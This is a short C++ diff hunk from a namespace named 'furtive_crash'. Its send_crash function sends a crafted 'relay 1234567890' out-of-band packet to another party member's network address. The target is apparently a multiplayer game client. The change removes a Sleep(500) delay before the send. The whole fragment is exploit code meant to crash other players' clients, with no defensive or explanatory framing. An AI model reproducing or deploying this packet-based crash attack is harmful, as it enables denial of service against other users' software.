@@ -31,10 +31,9 @@ namespace furtive_crash
 	*/
     void send_crash(std::size_t client_num)
 	{
-		Sleep(500);
-
 		char buf[1260];
 		msg_t msg;
+
 		t6::MSG_Init(&msg, buf, sizeof buf);
 		t6::MSG_WriteString(&msg, "relay 1234567890");
 		t6::NET_OutOfBandData(netsrc_t::NS_CLIENT1, t6::get_party_data()->get_party_member(client_num)->platformAddr.netAddr, msg.data, msg.cursize);
